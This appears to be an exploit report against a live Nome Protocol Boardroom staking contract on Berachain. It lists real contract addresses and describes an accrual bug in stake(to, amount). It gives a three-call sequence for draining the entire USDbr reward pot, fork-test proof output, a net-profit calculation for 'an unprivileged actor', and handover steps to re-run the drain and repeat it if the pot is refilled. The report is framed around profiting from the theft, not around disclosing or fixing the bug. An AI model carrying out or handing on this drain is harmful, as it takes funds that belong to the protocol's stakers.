# EX-08 — Nome Protocol: `Boardroom.stake(to)` retroactive reward claim

**Net for an unprivileged actor:** **$25.42** (gross $26.77; the entire 29.555 USDbr reward pot)
**Confidence:** HIGH — fork-proven at Berachain block 28,727,772
**Gate:** none
**Chain:** Berachain (80094)
**Status:** headline BailSec 2025 Issue_15 is **LIVE** in the deployed Boardroom.

## Contract

| Role | Address |
|---|---|
| LiquidBoardroom (verified, solc 0.6.6, non-proxy) | `0x50caa9627a940bcd4d5f3c3ed231252425af50cf` |
| NOME staking token | `0xFaF4c16847bD0ebaC546C49a9C9c6b81abd4b08C` |
| TokenManager | `0x911b3dfeFc79f76cb33dCAc53d92bd0E553Cc961` |
| USDbr reward token | `0x6d4223DAE2a8744a85a6d44e97f3F61679f87ee6` |

Live: Boardroom USDbr balance 29.555353019595691750; `stakingTokenSupply` 5,631.356 NOME; 24 snapshots; `lastEmissionBlock` 1,631,362; `pause=false`; `start` passed.

## Bug

`Boardroom.stake(to, amount)` updates accruals for `msg.sender` but credits the stake to `to`. A fresh `to` address keeps `lastAccrualSnapshotId = 0`, so it can claim retroactive USDbr rewards from snapshot 0 and drain the whole reward pot. The staked NOME is returned by `withdraw` in the same transaction.

## Step-by-step

```
stake(freshTo, 1,117.175 NOME)   // accrual updated for msg.sender, stake credited to freshTo
claimRewards(freshTo)            // freshTo has snapshot 0 -> claims the full 29.555 USDbr pot
withdraw(1,117.175 NOME)         // 100-block delay already satisfied (lastEmissionBlock old)
```

## PoC

`stage3/work/S3-235/Nome_Protocol_Audit_0x50caa9/poc`

Fork test at block 28,727,772:

```
[PASS] bob USDbr gain 29555353019595691749 wei
       bob NOME after withdraw 1117175261153053402954
       boardroom USDbr left 1 wei
       gas 760,579
```

Run with the Berachain RPC at block 28,727,772.

## Economics

- Gross 29.555 USDbr; USDbr $0.905875 → $26.77.
- NOME purchase 1,117.175 at $0.00120975 → $1.3515; gas 760,579.
- Net $25.42 (conservative; $26.74 if only round-trip slippage is counted).

## Evidence

- BailSec report: `https://github.com/bailsec/BailSec/blob/7c2a162e5452082f79f57904ba1c63c0114d25c6/Bailsec%20-%20Nome%20-%20Final%20Report.pdf`
- Etherscan V2 chain 80094 `getsourcecode` — LiquidBoardroom at the address.
- Live state: Boardroom USDbr 29.555353019595691750; 24 snapshots; snapshot 23 RPSU 26,455,430,985,010,505.
- Fork PoC output as above.

## Risks / caveats

- The reward pot is finite; after one claim it is empty.
- USDbr/NOME prices move; the net is small.
- If the Boardroom is paused or the pot is topped up, re-read.
- The oracle/RewardsPool findings in the batch are separate contracts, not this Boardroom.

## Handover

1. Re-read the Boardroom USDbr balance and snapshot count.
2. Re-run the fork PoC; confirm the fresh `to` claims the full pot and the NOME is returned.
3. Check `pause` and `lastEmissionBlock`.
4. If the pot is refilled, repeat; otherwise this is a one-shot $25 finding.
